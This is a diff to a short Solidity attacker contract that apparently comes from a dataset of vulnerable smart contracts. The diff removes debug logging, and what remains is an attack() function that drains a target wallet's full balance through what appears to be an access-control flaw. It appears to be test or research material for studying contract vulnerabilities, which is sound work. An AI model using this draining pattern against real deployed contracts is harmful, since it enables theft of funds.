@@ -1,7 +1,6 @@
 pragma solidity ^0.4.24;
 
 import "../dataset/access_control/wallet_04_confused_sign.sol";
-import "hardhat/console.sol";
 contract WalletAttacker {
     Wallet public target;
 
@@ -10,9 +9,7 @@ contract WalletAttacker {
     }
 
     function attack() public payable {
-        console.log("Attacking...");
         target.withdraw(address(target).balance);
-        console.log("After Attacking...");
     }
 
     function() public payable {}
